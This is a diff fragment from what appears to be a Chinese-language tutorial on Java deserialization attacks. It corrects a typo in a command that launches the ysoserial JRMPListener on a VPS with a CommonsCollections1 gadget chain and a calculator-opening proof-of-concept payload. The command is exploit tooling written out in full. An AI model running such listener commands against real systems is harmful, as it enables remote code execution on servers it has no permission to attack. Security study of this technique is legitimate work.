@@ -19,7 +19,7 @@ tags:
 在VPS端开启JRMPListener
 
 ```
-java -cp ysoserial.jar ysoserial.exploit.JRMPListener 7777 CommonsCollecitons1 'open /Applications/Calculator.app/'
+java -cp ysoserial.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections1 'open /Applications/Calculator.app/'
 ```
 
 #### 第二步
